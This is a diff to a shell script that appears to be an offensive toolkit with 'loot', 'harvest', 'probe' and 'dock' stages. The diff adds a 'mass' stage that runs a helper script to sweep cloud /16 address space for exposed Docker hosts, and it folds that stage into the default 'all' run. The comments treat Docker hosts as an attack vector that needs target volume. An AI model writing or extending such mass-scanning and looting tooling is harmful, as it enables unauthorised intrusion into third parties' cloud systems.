@@ -231,11 +231,21 @@ dock_now() {
     fi
 }
 
+# The repo queue is small and mostly noise (placeholders, version strings, CDN
+# IPs), so the docker vector gets its volume from cloud /16 space instead.
+# Bounded by MASS_BUDGET seconds, so this is safe inside a combined run.
+mass_now() {
+    if [ -r "$SELF_DIR/dockmass.sh" ]; then
+        HUNT_WORK="$WORK" sh "$SELF_DIR/dockmass.sh" || true
+    fi
+}
+
 case "${1:-all}" in
     loot)    loot_now ;;
     dock)    dock_now ;;
+    mass)    mass_now ;;
     harvest) harvest ;;
     probe)   probe ;;
-    all)     loot_now; harvest; probe; dock_now ;;
-    *)       echo "usage: $0 [loot|dock|harvest|probe|all]"; exit 2 ;;
+    all)     loot_now; harvest; probe; dock_now; mass_now ;;
+    *)       echo "usage: $0 [loot|dock|mass|harvest|probe|all]"; exit 2 ;;
 esac
